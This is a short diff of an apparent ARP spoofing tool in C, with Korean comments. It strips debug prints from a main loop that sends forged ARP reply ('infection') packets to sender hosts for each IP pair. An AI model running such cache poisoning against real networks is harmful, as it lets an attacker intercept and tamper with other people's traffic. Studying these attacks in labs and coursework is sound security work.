@@ -24,12 +24,7 @@ int main(int argc, char* argv[]) {
         fprintf(stderr, "Failed to get MAC address for %s\n", dev);
         return -1;
     }
-    printf("\n");
-    print_mac(my_mac);
-    printf("\n");
     uint32_t my_ip = getMyIp(dev);
-    print_ip(my_ip);
-    printf("\n");
 
     // 3. 반복문으로 모든 IP 쌍에 대해 공격 수행
     while(true) {
@@ -49,11 +44,7 @@ int main(int argc, char* argv[]) {
                 printf("Failed to get sender's MAC address.\n");
                 continue;
             }
-            // 3. 위조된 ARP Reply (Infection) 패킷을 sender에게 전송
-            printf("\n");
-            printf("attack_mac: ");
-            print_mac(sender_mac);
-            printf("\n");
+            // 3. 위조된 ARP Reply 패킷을 sender에게 전송
             send_arp_attack(pcap, sender_mac, sender_ip, target_ip, my_mac);
         }
     }
